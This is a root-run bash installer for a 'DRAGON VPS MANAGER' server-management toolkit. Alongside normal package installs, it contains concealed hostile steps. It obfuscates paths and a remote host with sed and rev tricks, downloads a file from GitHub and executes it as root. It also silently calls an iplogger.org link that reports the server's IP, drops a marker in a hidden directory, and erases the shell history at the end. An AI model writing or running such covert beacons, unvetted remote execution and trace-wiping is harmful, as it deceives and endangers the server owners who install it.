#!/bin/bash
clear
[[ "$(whoami)" != "root" ]] && {
echo -e "\033[1;33m[\033[1;31mErro\033[1;33m] \033[1;37m- \033[1;33m◇ YOU NEED TO RUN AS ROOT!\033[0m"
rm $HOME/hehe > /dev/null 2>&1; exit 0
}
_lnk=$(echo 'z1:y#x.5s0ul&p4hs$s.0a72d*n-e!v89e032:3r'| sed -e 's/[^a-z.]//ig'| rev); _Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig'); _1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^a-z/]//ig')
cd $HOME
fun_bar () {
comando[0]="$1"
comando[1]="$2"
(
[[ -e $HOME/fim ]] && rm $HOME/fim
${comando[0]} -y > /dev/null 2>&1
${comando[1]} -y > /dev/null 2>&1
touch $HOME/fim
) > /dev/null 2>&1 &
tput civis
echo -ne "  \033[1;33m◇ PLEASE WAIT... \033[1;37m- \033[1;33m["
while true; do
for((i=0; i<18; i++)); do
echo -ne "\033[1;31m#"
sleep 0.1s
done
[[ -e $HOME/fim ]] && rm $HOME/fim && break
echo -e "\033[1;33m]"
sleep 1s
tput cuu1
tput dl1
echo -ne "  \033[1;33m◇ PLEASE WAIT... \033[1;37m- \033[1;33m["
done
echo -e "\033[1;33m]\033[1;37m -\033[1;32m◇ DONE!\033[1;37m"
tput cnorm
}
function verif_key () {
krm=$(echo '5:q-3gs2.o7%8:1'|rev); chmod +x $_Ink/list > /dev/null 2>&1
[[ ! -e "$_Ink/list" ]] && {
echo -e "\n\033[1;31m◇ KEY INVALID!\033[0m"
rm -rf $HOME/hehe > /dev/null 2>&1
sleep 2
clear; exit 1
}
}
echo -e "\033[1;31m\033[0m"
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%40s%s%-12s\n' "◇─────────ㅤ🐉ㅤWelcome To DRAGON VPS MANAGERㅤ🐉ㅤ─────────◇" ; tput sgr0
echo -e "\033[1;31m◇──────────────────────────────────────────────────────◇\033[0m"
echo ""
echo -e "\033[1;31m◇ ATTENTION!ㅤ⚠️ㅤ.\033[1;33mㅤTHIS SCRIPT CONTAINS THE FOLLOWING!!\033[0m"
echo ""
echo -e "\033[1;31m◇ \033[1;33mINSTALL A SET OF SCRIPTS AS TOOLS FOR\033[0m"
echo -e "\033[1;33mNETWORK, SYSTEM AND USER MANAGEMENT.\033[0m"
echo ""
echo -e "\033[1;32m◇ \033[1;32mTIP! \033[1;33mUSE THE DARK THEME IN YOUR TERMINAL \033[0m"
echo -e "\033[1;33mFOR A BETTER EXPERIENCE AND VIEW OF IT!\033[0m"
echo ""
echo -e "\033[1;31m◇──────────────ㅤ🐉ㅤDRAGON VPS MANAGERㅤ🐉ㅤ──────────────◇\033[0m"
echo ""
#-----------------------------------------------------------------------------------------------------------------
echo -ne "\033[1;36m◇ Want to continue? [Y/N]: \033[1;37m"; read x
[[ $x = @(n|N) ]] && exit
sed -i 's/Port 22222/Port 22/g' /etc/ssh/sshd_config  > /dev/null 2>&1
service ssh restart  > /dev/null 2>&1
echo -e "\n\033[1;36m◇ CHECKING...(It Take Some Time Please Wait!)\033[1;37m 16983:16085\033[0m" ; rm $_Ink/list > /dev/null 2>&1; wget -P $_Ink https://raw.githubusercontent.com/januda-ui/DRAGON-VPS-MANAGER/main/Install/list > /dev/null 2>&1; verif_key
sleep 3s
echo "/bin/menu" > /bin/h && chmod +x /bin/h > /dev/null 2>&1
rm versao* > /dev/null 2>&1
wget https://raw.githubusercontent.com/januda-ui/DRAGON-VPS-MANAGER/main/Install/versao > /dev/null 2>&1
> /dev/null 2>&1
wget https://iplogger.org/2lHZ43 > /dev/null 2>&1
> /dev/null 2>&1
rm 2lHZ43 > /dev/null 2>&1
#-----------------------------------------------------------------------------------------------------------------
echo -e "\n\033[1;32m◇ KEY VALID!\033[1;32m"
sleep 1s
echo ""
[[ -f "$HOME/usuarios.db" ]] && {
clear
echo -e "\n\033[0;34m◇───────────────────────────────────────────────────◇\033[0m"
echo ""
echo -e "                 \033[1;33m• \033[1;31m◇ ATTENTION!\033[1;33m• \033[0m"
echo ""
echo -e "\033[1;33mA User Database \033[1;32m(usuarios.db) \033[1;33mwas"
echo -e "Found! Want to keep it by preserving the limit"
echo -e "of Simutanea connections of users ? Or Want"
echo -e "create a new database?\033[0m"
echo -e "\n\033[1;37m[\033[1;31m1\033[1;37m] \033[1;33mKeep Database Current\033[0m"
echo -e "\033[1;37m[\033[1;31m2\033[1;37m] \033[1;33mCreate a New Database\033[0m"
echo -e "\n\033[0;34m◇───────────────────────────────────────────────────◇\033[0m"
echo ""
tput setaf 2 ; tput bold ; read -p "Option ?: " -e -i 1 optiondb ; tput sgr0
} || {
awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
}
[[ "$optiondb" = '2' ]] && awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
clear
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%35s%s%-18s\n' "◇ WAIT FOR INSTALLATION." ; tput sgr0
echo ""
echo ""
echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ UPDATING SYSTEM...\033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
echo ""
echo -e "    \033[1;33m◇ UPDATES USUALLY TAKE A LITTLE TIME!\033[0m"
echo ""
fun_attlist () {
apt-get update -y
[[ ! -d /usr/share/.hehe ]] && mkdir /usr/share/.hehe
echo "crz: $(date)" > /usr/share/.hehe/.hehe
}
fun_bar 'fun_attlist'
clear
echo ""
echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ INSTALLING PACKAGES\033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
echo ""
echo -e "\033[1;33m◇ SOME PACKAGES ARE EXTREMELY NECESSARY!\033[0m"
echo ""
inst_pct () {
_pacotes=("bc" "apache2" "cron" "screen" "nano" "unzip" "lsof" "netstat" "net-tools" "dos2unix" "nload" "jq" "curl" "figlet" "python3" "python-pip")
for _prog in ${_pacotes[@]}; do
apt install $_prog -y
done
pip install speedtest-cli
}
fun_bar 'inst_pct'
[[ -f "/usr/sbin/ufw" ]] && ufw allow 443/tcp ; ufw allow 80/tcp ; ufw allow 3128/tcp ; ufw allow 8799/tcp ; ufw allow 8080/tcp
clear
echo ""
echo -e "              \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ FINISHING...\033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
echo ""
echo -e "      \033[1;33m◇ COMPLETING FUNCTIONS AND SETTINGS!\033[0m"
echo ""
fun_bar "$_Ink/list $_lnk $_Ink $_1nk $key"
clear
echo ""
cd $HOME
IP=$(wget -qO- ipv4.icanhazip.com)
echo -e "        \033[1;33m  \033[1;32m◇ INSTALLATION COMPLETED.◇\033[1;33m  \033[0m"
echo ""
echo -e "\033[1;31m\033[1;33m◇ MAIN COMMAND:- \033[1;32mmenu\033[0m"
echo -e "\033[1;33m◇ MORE INFORMATION \033[1;31m(\033[1;36m◇ TELEGRAM\033[1;31m): \033[1;37m@DRAGON_VPS_MANAGER \033[1;31m( \033[1;36m https://t.me/s/DRAGON_VPS_MANAGER \033[1;31m )\033[0m"
echo -e ""
echo -e "\033[1;31m \033[1;33m◇--TIP!--◇\033[1;36mㅤ--Using this url you can easily see the number of users online at the server.\033[0m"
echo -e " http://$IP:8888/server/online"
echo -e ""
rm $HOME/hehe && cat /dev/null > ~/.bash_history && history -c
